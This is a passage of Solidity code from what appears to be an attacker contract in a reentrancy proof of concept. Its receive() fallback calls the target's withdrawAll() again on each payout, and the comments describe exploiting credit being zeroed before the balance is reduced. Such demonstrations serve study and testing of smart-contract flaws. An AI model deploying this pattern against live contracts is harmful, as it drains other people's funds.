    uint256 public credit;

    constructor(C _target) {
        target = _target;
    }

    function deposit() external payable {
        target.deposit{value: msg.value}();
        credit += msg.value;
    }

    receive() external payable {
        if (msg.sender == address(target)) {
            // Reenter withdrawAll if we still have credit recorded in Attacker (but target may have zeroed it)
            // This exploits the bug where credit is zeroed before balance is reduced.
            target.withdrawAll();
        }
    }
